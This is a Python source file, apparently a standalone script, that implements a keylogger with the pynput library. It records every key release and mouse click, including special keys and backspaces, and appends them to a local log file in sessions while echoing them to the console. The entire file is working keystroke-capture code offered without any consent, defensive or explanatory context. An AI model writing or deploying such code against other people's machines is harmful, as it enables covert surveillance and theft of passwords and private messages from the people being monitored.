from pynput import keyboard, mouse
import os

LOGFILE = "logs/log.txt"

# Ensure log directory exists
os.makedirs(os.path.dirname(LOGFILE), exist_ok=True)

def start_new_session():
    """Insert a newline + marker at the start of a new logging session."""
    try:
        with open(LOGFILE, "a", encoding="utf-8") as f:
            f.write("\n--- New Session ---\n")
    except Exception as e:
        print("⚠️ Could not start new session:", e)

def save_to_file(text):
    """Append text continuously on one line in log.txt."""
    try:
        with open(LOGFILE, "a", encoding="utf-8") as f:
            f.write(text)  # newline only if text includes "\n"
        print(text, end="", flush=True)
    except Exception as e:
        print("⚠️ Could not write to file:", e)

def on_release(key):
    try:
        save_to_file(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            save_to_file(" ")
        elif key == keyboard.Key.enter:
            save_to_file("\n")  # explicit newline
        elif key == keyboard.Key.backspace:
            save_to_file("[BACKSPACE]")
        elif hasattr(key, "name"):
            save_to_file(f"[{key.name.upper()}]")

def on_click(x, y, button, pressed):
    if pressed:
        btn_name = str(button).split('.')[-1].upper()
        save_to_file(f"[{btn_name}_CLICK]")

# Start logging session
start_new_session()

# Start listeners
kb_listener = keyboard.Listener(on_release=on_release)
mouse_listener = mouse.Listener(on_click=on_click)

kb_listener.start()
mouse_listener.start()

# Wait for keyboard listener; stop mouse listener when done
kb_listener.join()
mouse_listener.stop()
